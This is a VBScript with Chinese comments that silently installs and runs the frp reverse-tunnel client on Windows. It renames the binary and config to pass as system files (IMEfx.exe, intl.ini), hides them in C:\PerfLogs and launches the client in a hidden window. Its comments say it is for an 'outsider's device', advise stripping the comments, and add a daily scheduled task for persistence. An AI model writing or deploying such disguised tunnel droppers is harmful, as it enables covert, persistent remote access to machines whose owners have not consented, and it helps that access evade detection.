' support windows ; for outsider's device 
' 1、准备3个文件( frp.exe、frp.ini、frp.vbs )复制到 dir_bak 目录，并修改相应变量名和路径
' 2、测试 frp.vbs 是否可正常运行
' 3、复制 frp.vbs 到系统开机启动目录并重命名为 systemstartup.vbs (并建议删除所有注释)---停用，改用计划任务
'    开机启动目录 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup ; 需要登陆系统才能运行，建议使用计划任务
' 4、将脚本添加进计划任务：schtasks.exe /create /tn "frpc" /tr "C:\PerfLogs\frpc.vbs" /sc daily /st 07:00:00

On Error Resume Next

Dim dir_bak, frp, frpini, dir_run, frp_run, frpini_run
dir_bak = "C:\Program Files\Windows NT\"
frp = "frpc.exe"
frpini = "frpc.ini"
' 注意dir_bak、dir_run目录后面要带反斜杠 \ , 上面三个变量或下面三个变量必须要有一组定义正确
dir_run = "C:\PerfLogs\"
frp_run = "IMEfx.exe"
frpini_run = "intl.ini"

Dim fsObj
Set fsObj = CreateObject("Scripting.FileSystemObject")
Function CopyFileFun(runfile,soufile,desfile)
  If Not fsObj.FileExists(runfile) Then fsObj.CopyFile (soufile), (desfile) End If
End Function
CopyFileFun (dir_run & frp_run),(dir_bak & frp),(dir_run & frp_run)
CopyFileFun (dir_run & frpini_run),(dir_bak & frpini),(dir_run & frpini_run)

' ------ 判断系统进程是否存在 -------------------------------
Dim proc,procfrp,frpProcess
Set proc = GetObject("winmgmts:\\.\root\cimv2")
' ------ 注意此处查询进程是否存在时需要手动输入进程名，使用变量运行失败-----待解决
Set procfrp = proc.ExecQuery("select * from win32_process where name = 'IMEfx.exe'")
For Each pf In procfrp
  frpProcess = True 
Next

set objShell = WScript.CreateObject("WScript.Shell")
If Not frpProcess Then objShell.Run (dir_run & frp_run & " -c " & dir_run & frpini_run), 0 End If

WScript.Quit
